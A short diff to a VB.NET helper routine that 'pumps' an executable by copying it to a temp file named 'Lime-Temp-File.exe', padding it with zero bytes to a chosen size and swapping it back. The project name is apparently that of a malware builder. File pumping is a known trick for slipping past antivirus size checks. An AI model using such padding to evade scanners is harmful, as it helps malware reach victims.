@@ -57,16 +57,19 @@ Public Class Helper
         Try
             Dim filesize As Double = Val(Main.numPump.Value)
             filesize = filesize * 1024
-
-            Dim filetopump = IO.File.OpenWrite(Path)
+            Dim filetemp = IO.Path.GetTempPath + "\Lime-Temp-File.exe"
+            IO.File.Copy(Path, filetemp, True)
+            Dim filetopump = IO.File.OpenWrite(filetemp)
             Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
             While size < filesize
                 filetopump.WriteByte(0)
                 size += 1
             End While
             filetopump.Close()
+            IO.File.Delete(Path)
+            IO.File.Move(filetemp, Path)
         Catch ex As Exception
-
+            MsgBox(ex.Message)
         End Try
     End Sub
 
